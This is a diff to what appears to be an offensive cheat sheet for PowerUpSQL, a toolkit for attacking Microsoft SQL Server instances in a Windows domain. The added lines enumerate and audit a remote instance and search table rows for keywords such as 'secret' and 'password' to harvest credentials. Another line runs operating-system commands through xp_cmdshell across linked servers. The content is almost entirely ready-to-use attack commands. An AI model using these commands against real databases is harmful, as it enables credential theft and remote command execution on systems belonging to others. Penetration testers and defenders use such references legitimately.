@@ -4,6 +4,15 @@ Get-SQLInstanceDomain -Verbose | Get-SQLServerinfo -Verbose
 # list accessible SQL server using credentials
 Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username <user> -password <password> | Where-Object {$_.Status -like "Accessible"}
 
+# get information from specific instance
+Get-Sqlserverinfo -instance <rhost>
+
+# scan for misconfiguration
+Invoke-sqlaudit -instance <rhost>
+
+# search database rows for specific keywords (NoDefaults skip default tables)
+Get-SQLColumnSampleData –Verbose –Keyword "secret,password" –SampleSize 10 –NoDefaults -Instance <rhost>
+
 # execute commands
-Get-SQLServerLinkCrawl -Instance <computer> -Query "exec master..xp_cmdshell '<command>'"
+Get-SQLServerLinkCrawl -Instance <rhost> -Query "exec master..xp_cmdshell '<command>'"
 
